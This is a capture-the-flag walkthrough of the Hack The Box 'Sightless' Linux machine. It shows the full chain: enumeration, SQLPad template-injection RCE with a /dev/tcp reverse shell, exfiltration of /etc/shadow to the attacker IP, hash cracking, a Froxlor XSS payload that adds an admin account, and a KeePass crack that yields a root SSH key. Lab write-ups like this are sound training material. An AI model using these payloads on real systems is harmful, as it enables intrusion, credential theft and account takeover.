## **Overview**

- **Difficulty:** Easy
- **Operating System:** Linux
- **Objective:** Understand potential breaking points in sightless machine.
- **Tools Used:** `Nmap`, `SSH`, `FTP`, `Burpsuite`, `Hashcat`, `John The Ripper`, `FoxyProxy`, `nc`, `Gobuster`, `curl`, `filezilla`, `keep2john`, `kpcli`, `dos2unix`

---

I tend to start enumerating as much basic information as I need before dwelving deeper.
## **Performing Nmap Scans**

As usual the very first step is to figure out what ports and hence what services are actually open. This will set the stage for how we will try to break in.
Let's start with a stealth scan with disabled arp pings to figure out what ports are open:
```
$ nmap -sS -Pn --disable-arp-ping -vv -oN nmap-scans/stealth-scan sightless.htb

Nmap scan report for sightless.htb (10.10.11.32)
Host is up, received user-set (0.28s latency).
Scanned at 2025-01-16 22:49:27 IST for 11s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Jan 16 22:49:38 2025 -- 1 IP address (1 host up) scanned in 11.42 seconds
```

It is clear that the following ports are open:
- `21` ~ FTP
- `22` ~ SSH
- `80` ~ HTTP

Now, let's move further and scan for service versions and run the default scripts on these three ports:
```
$ nmap -sV -sC -p21,22,80 -vv -oN nmap-scans/service-script-scan sightless.htb

Nmap scan report for sightless.htb (10.10.11.32)
Host is up, received reset ttl 63 (0.29s latency).
Scanned at 2025-01-16 22:50:45 IST for 76s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnkBNKXp5ql1R+kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg=
|   256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Sightless.htb
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=1/16%Time=67893FF9%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20
SF:Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20
SF:try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x
SF:20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 16 22:52:01 2025 -- 1 IP address (1 host up) scanned in 76.66 seconds
```

From this I interpreted the following information:
- `FTP` runs on `21` exposing a ProFTPD server whose hostname is sightless.htb
- `SSH` runs on `22` exposing an Ubuntu OS in use
- `HTTP` runs on `80` exposing a Nginx server, confirms the use of Ubuntu and hints to presence of a webpage.

Let's move on to grabbing banners to see if something comes up.
But while we do other enumerations, let's run some scans that will most likely take ages to accomplish. So, I've also performed a full port nmap stealth scan:
```
$ nmap -sS sightless.htb -p1000-65535 -Pn --disable-arp-ping -vv -oN nmap-scans/stealth-all-port-scan
```

(Ouput of this later)

## **Banner Grabbing**

Let's call back for some banners, you never know they sometimes come back with some really important information and confirm service versions used.

Starting with `FTP`:
```
$ nc -nv 10.10.11.32 21 > banner-grab/FTP-Banner
220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
```

Next, with `SSH`:
```
$ nc -nv 10.10.11.32 22 > banner-grab/SSH-Banner
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
```

Finally, for `HTTP` first I used `nc` but did not come back with anything, so I use `curl` with the `-IL` flag where `-I` fetches only the HTTP Headers and `-L` allows curl to redirect if returned with say *The website has been redirected to x*.
```
$ curl -IL http://sightless.htb/ | tee -a banner-grab/HTTP-Banner

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 16 Jan 2025 17:42:50 GMT
Content-Type: text/html
Content-Length: 4993
Last-Modified: Fri, 02 Aug 2024 10:01:13 GMT
Connection: keep-alive
ETag: "66acae69-1381"
Accept-Ranges: bytes
```

Confirms all data from the Nmap scans.
Apart from that nothing very special.

## **Gobuster Directory Enumeration**

Next up, I did some `gobuster` enumeration.
First, I used the text file from `secslist` called `common.txt` as:
```
$ gobuster dir --url http://sightless.htb/ --wordlist ~/Documents/Tools/Wordlists/SecLists/Discovery/Web-Content/common.txt -o dir-enums/common-txt

/images               (Status: 301) [Size: 178] [--> http://sightless.htb/images/]
/index.html           (Status: 200) [Size: 4993]
```

Secondly, I used another text file called `directory-list-lowercase-2.3-small.txt`:
```
$ gobuster dir --url http://sightless.htb/ --wordlist ~/Documents/Tools/Wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o dir-enums/small-directory-list-lowercase

/images               (Status: 301) [Size: 178] [--> http://sightless.htb/images/]
/icones               (Status: 301) [Size: 178] [--> http://sightless.htb/icones/]

```

---

At this point, enough basic scanning is complete and I will now move on towards browsing to *sightless.htb* to discover what else catches the eyes.

## **Wappalyzer Information**

Let's finally wrap up with getting a glimpse of what web technologies this webpage is working on:
![[Pasted image 20250116234247.png]]
(Don't have it? Just search for `wappalyzer <your-browser> plugin` and enable the plugin on the page you wish to scan)

## **Browsing**

Upon initial search, this is what the webpage looks like.
![[Pasted image 20250116234505.png]]

The source code is also nothing special.
However, on the website there are two specific buttons of much interest:
![[Pasted image 20250116234727.png]]

The first button leads to `SQLPad` which looks like a SQL IDE of some sorts. While, the second takes you to `Froxlor` homepage.

## **Teasing around SQLPad**

And just before we move on, also save this URL in your /etc/hosts cause otherwise it might not open:
```
$ cat /etc/hosts

# HTB Modules
10.10.11.32 sightless.htb
10.10.11.32 sqlpad.sightless.htb
```

Let's create a new connection using the `MYSQL` driver and let's just name it as `TEST-CONNECTION`. Before we do anything let's run a server at `4444` and see whether the target connects back to us:
```
$ nc -lvnp 4444 2>&1 | tee rev-shells/test-connection 
Listening on 0.0.0.0 4444
```

Now, go to the `sqlpad` page again and insert your as in you the attackers IP and port on which the nc is running (find IP using ifconfig TUN interface):
![[Pasted image 20250117010902.png]]

Now, if we click on Test, and go back to our server.
```
$ nc -lvnp 4444 2>&1 | tee rev-shells/test-connection 
Listening on 0.0.0.0 4444
Connection received on 10.10.11.32 46804
```

Bang! We have a connection! This means **SSRF or Server Side Request Forgery vulnerability is present**.

Now, i'm going to go directly for trying to exploit it.

---
## **Searching for Exploits**

Let's go ahead and search for exploits.
First a quick check of the server version:
![[Pasted image 20250117014727.png]]

I now simply searched for *SQLPad 6.10.0 exploit* and hit this NIST page https://nvd.nist.gov/vuln/detail/CVE-2022-0944 which seems like CVE-2022-0944.
Then forwarded to this page which was available on NIST:
![[Pasted image 20250117014913.png]]

It should look something like this at https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb:
![[Pasted image 20250117014943.png]]

## **Gaining Reverse Shell**

Carefully reading the exploit, it says that it is a Template Injection vulnerability which usually involves a misconfigured database input which is not cross checked/validated and can lead to a RCE.

The next steps are clear:
![[Pasted image 20250117015211.png]]

I first crafted the reverse shell code that needs to be executed:
```
$ echo -n 'bash -i &> /dev/tcp/10.10.14.191/4444 0>&1' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC4xOTEvNDQ0NCAwPiYx
```

This I will decode in the target machine and run via bash which will create the reverse shell.
I just need to do two things now:
1. Create the rev shell server on my machine
2. Modify the exploit code
3. Upload the code

Let's first create the server:
```
$ nc -lvnp 4444 2>&1 | tee rev-shells/rev-attempt1
Listening on 0.0.0.0 4444
```

Next, let's create the final exploit code:
```
{{ process.mainModule.require('child_process').exec('echo YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC4xOTEvNDQ0NCAwPiYx | base64 -d | bash') }}
```

Now, go to `SQLPad sightless.htb` page and enter:
- `IP` - 10.10.14.191
- `Database` - {{ process.mainModule.require('child_process').exec('echo YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC4xOTEvNDQ0NCAwPiYx | base64 -d | bash') }}

![[Pasted image 20250117015806.png]]

And, bingo! You get root access!
```
Listening on 0.0.0.0 4444
Connection received on 10.10.11.32 51178
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# 
```

---
## **Browsing for Credentials**

Once in, it is visible that we are logged on as root.
So, let's make use of our privs. I will cat `/etc/passwd` and `/etc/shadow` back to my machine.
First, start a local machine at port `5555` (choose any port you may like).
Then,
```
root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow > /dev/tcp/10.10.14.191/5555
<qlpad# cat /etc/shadow > /dev/tcp/10.10.14.191/5555
root@c184118df0a6:/var/lib/sqlpad# cat /etc/passwd > /dev/tcp/10.10.14.191/5555
<qlpad# cat /etc/passwd > /dev/tcp/10.10.14.191/5555
```

Now, you should have both of these locally:
```
$ ls -lsh
total 16K
4.0K -rw-rw-r-- 1 alice alice 1.1K Jan 17 23:04 etc-passwd
4.0K -rw-rw-r-- 1 alice alice  833 Jan 17 23:01 etc-shadow
4.0K -rw-rw-r-- 1 alice alice 3.5K Jan 17 23:20 rev-attempt1
4.0K -rw-rw-r-- 1 alice alice   67 Jan 17 01:04 test-connection
```

Upon closer look at `/etc/shadow`:
```
$ cat etc-shadow 
Listening on 0.0.0.0 5555
Connection received on 10.10.11.32 43716
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

Bingo! We have hashed passwords of `root` and `michael`.
Copy and paste both these into separate files so we can work towards getting the passwords.
Let's work on `root` first:
```
$ hashcat imp-files/root-password-hash ~/Documents/Tools/Wordlists/rockyou.txt | tee imp-files/root-password
$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:blindside
```

Now, for `michael`:
```
$ hashcat -m 1800 imp-files/michael-password-hash ~/Documents/Tools/Wordlists/rockyou.txt | tee imp-files/michael-password
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
```

We now have passwords for both:
```
root:blindside
michael:insaneclownposse
```

Let's quickly login as michael and check for the user flag:
```
$ ssh michael@sightless.htb
The authenticity of host 'sightless.htb (10.10.11.32)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sightless.htb' (ED25519) to the list of known hosts.
michael@sightless.htb's password: 
Last login: Fri Jan 17 17:23:00 2025 from 10.10.16.33
michael@sightless:~$
```

Checking the contents:
```
michael@sightless:~$ ls -lsh
total 4.0K
4.0K -rw-r----- 1 root michael 33 Jan 17 17:23 user.txt
michael@sightless:~$ cat user.txt
```

There is the user flag.
The same however does not work for root, so we've got to search for other ways.

## **Searching for Root Flag**

Upon checking for listening ports, it is listening on `127.0.0.1:8080`.
```
$ ssh michael@sightless.htb -L 8081:127.0.0.1:8080
michael@sightless.htb's password: 
Last login: Sat Jan 18 05:42:44 2025 from 10.10.14.191
michael@sightless:~$
```

Now, upon visiting:
![[Pasted image 20250118122636.png]]

Let's look for some vulnerabilities that affect `froxlor`.
You'll eventually find a page https://github.com/froxlor/Froxlor/security/advisories/GHSA-x525-54hf-xr53 which has a payload that affects a XSS vulnerability.

![[Pasted image 20250118123112.png]]

So, accroding to the CVE we need to login with fake creds and then upload the payload.
But first, lets format the payload a bit.
Go to `burpsuite > decoder`:
![[Pasted image 20250118123320.png]]

Upon more formatting i.e. by replacing ';' with `new lines` and '+' with ' '.
Also replace the link to:
```
admin{{$emit.constructor`function b(){
var metaTag=document.querySelector('meta[name="csrf-token"]')
var csrfToken=metaTag.getAttribute('content')
var xhr=new XMLHttpRequest()
var url="/admin_admins.php"
var params="new_loginname=abcd&admin_password=Abcd@@1234&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=Abcd&email=yldrmtest@gmail.com&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token=" csrfToken "&page=admins&action=add&send=send"
xhr.open("POST",url,true)
xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")
alert("Your Froxlor Application has been completely Hacked")
xhr.send(params)}
a=b()`()}}
```

Now, intercept the login on burp and upload the payload after login as:
![[Pasted image 20250118123714.png]]

Now, on froxlor login with credentials:
```
username:abcd
password:Abcd@@2024
```

And.... you're in!
![[Pasted image 20250118123914.png]]

There's this user called `web1`, click on the user and change his password.
Copy the credentials so it's safe with you:
![[Pasted image 20250118124010.png]]

Now, let's FTP into web1 with `filezilla` cause normal CLI `FTP`  was not working.
Deep in the backups you will find:
![[Pasted image 20250118124132.png]]

Let's `keepass2john` it to get its `.hash` so that john can work at it:
```
 ~/Documents/Tools/Password-Cracking/JohnTheRipper/run/keepass2john Database.kdb > Database.kdb.hash
```

```
$ cat Database.kdb.hash
Database.kdb:$keepass$*1*600000*0*6a92df8eddaee09f5738d10aadeec391*29b2b65a0a6186a62814d75c0f9531698bb5b42312e9cf837e3ceeade7b89e85*f546cac81b88893d598079d95def2be5*9083771b911d42b1b9192265d07285e590f3c2f224c9aa792fc57967d04e2a70*1*5168*14bee18518f4491ef53856b181413055e4d26286ba94ef50ad18a46b99571dea3bfab3faba16550a7e2191179a16a0e38b806bb128c78d98ae0a50a7fafea327a2a247f22f2d8c78dfae6400c9e29e25204d65f9482608cfc4e48a8f5edfd96419ac45345c73aa7fb3229de849396b393a71a85e91cf5ac459f3e447ee894f8f3cf2d982dfb023183c852805fbcc9959d4e628ab3655d2df1feb4ceff80f0782b28ff893e7dfd3b5fa42e2c4dad79544e55931e62b1b6ec678b800db1ddf3f9176f6eab55724c38f49642608df2fdf300ff13d2e6391c45e321ef5b8223d722585f3bb1dcce3b560c4e8a73a51e57a8a151f426219ecd692111f902756a2295045f0425f998dba7ea54cdf615f55ee1065daec8345ca17a4c1c73bd60efebf7e8aab724bb897686145ea0eaf02495702da93365627f8cad3595beb88ca1de110235262133c1f2e24fca87eb98484d078bcf5c8a9d82df21266c39945c4876f840e1d20005898c70c22d5446f51c4786eb4af5c794ba0997cbdd77f1bc26d298e84b2509adb949221bf18cafaae6872f39f653310fa5b5d952b93be743fe14b2b99d9cbaf565e222105fb30b23f7cf447cdb3c14856a45bd7a0095afa5f8305430bed5f3b407f05f7def2fa219dc0623749d44230afbf2be2271c8f7cd5a5aa6b71d08625398c45e5ef9019ebd7a34245db3376d13c6f6bbcb6e567bf0eb8aa4ff2be7aa7d1b531e2673a66b605b0eba41da786c659f21db45092fe9b0fae8516f59ebc5db14f289076e1e4d65f83426f2b9c4b54e35891aea08d5c01058ac76533af054a7668d6a278f348f7dc12f89c00c05a64a8be

...
```

Now use hashcat with `-m 13700` to get the master password which should be `bulldogs`.
Now, we're free to login:
```
$ kpcli -kdb Database.kdb
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>
```

Let's `find`:
```
kpcli:/General> find .
Searching for "." ...
 - 1 matches found and placed into /_found/
Would you like to show this entry? [y/N] 
=== Entries ===
0. ssh                                                                    

 Path: /General/sightless.htb/Backup/
Title: ssh
Uname: root
 Pass: q6gnLTB74L132TMdFCpK
  URL: 
Notes: 
Atchm: id_rsa (3428 bytes)
```

Let's get this `id_rsa` using `attach`:
```
kpcli:/General> cd /General/sightless.htb/Backup
kpcli:/General/sightless.htb/Backup> attach ssh
Atchm: id_rsa (3428 bytes)
Choose: (a)dd/(e)xport/(d)elete/(c)ancel/(F)inish? 
Path to file: /home/alice/id_rsa
Saved to: /home/alice/id_rsa
Atchm: id_rsa (3428 bytes)
```

Now, coming back to my remote machine I see:
```
$ ls -lsh
total 7.3M
4.0K drwxrwxr-x 2 alice alice 4.0K Jan 17 00:54 banner-grab
4.0K drwxrwxr-x 2 alice alice 4.0K Jan 17 00:56 dir-enums
4.0K drwxrwxr-x 2 alice alice 4.0K Jan 18 11:55 froxlor-payload
4.0K drwxrwxr-x 2 alice alice 4.0K Jan 18 14:24 FTP-Session
4.0K -rw-rw-r-- 1 alice alice 3.4K Jan 18 15:02 id_rsa
4.0K drwxrwxr-x 2 alice alice 4.0K Jan 17 23:19 imp-files
4.0K -rw-rw-r-- 1 alice alice 3.3K Jan 17 22:20 lab_araizn.ovpn
4.0K drwxrwxr-x 2 alice alice 4.0K Jan 17 00:52 nmap-scans
4.0K drwxrwxr-x 2 alice alice 4.0K Jan 17 23:04 rev-shells
7.0M -rw-rw-r-- 1 alice alice 7.0M Jan 17 23:40 Sightless.pdf
188K -rw-rw-r-- 1 alice alice 185K Jan 17 22:55 sqlpad.sqlite
```

There is the `id_rsa`. Let's use this to see whether it's usable or somethings need to be fixed:
```
$ ssh -i id_rsa root@10.10.11.32
Load key "id_rsa": error in libcrypto
root@10.10.11.32's password: 
Permission denied, please try again.
root@10.10.11.32's password: 
```

Let's convert it to UNIX format:
```
$ dos2unix id_rsa 
dos2unix: converting file id_rsa to Unix format...
```

Now, let's try again:
```
$ ssh -i id_rsa root@10.10.11.32
Last login: Tue Sep  3 08:18:45 2024
root@sightless:~# ls -lsh
total 12K
4.0K drwxr-xr-x 3 root root 4.0K Aug  9 11:17 docker-volumes
4.0K -rw-r----- 1 root root   33 Jan 17 17:23 root.txt
4.0K drwxr-xr-x 3 root root 4.0K Aug  9 11:17 scripts
```

There is your root flag!

---

**Prepared by Araiz Naqvi**